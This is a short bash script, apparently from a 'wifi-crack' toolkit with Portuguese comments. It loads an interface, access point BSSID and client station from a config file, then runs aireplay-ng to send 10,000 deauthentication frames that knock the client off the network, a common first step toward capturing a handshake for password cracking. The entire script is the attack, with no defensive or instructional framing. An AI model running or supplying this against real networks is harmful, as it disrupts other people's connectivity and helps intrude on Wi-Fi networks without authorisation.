#!/bin/bash

PWD="$(pwd)"
source "$PWD/wifi-crack.conf"
#### VARIAVEIS UTILIZADAS
# INTERFACE
# BSSID
# STATION

aireplay-ng --deauth 10000 -a "$BSSID" -c "$STATION" "$INTERFACE"

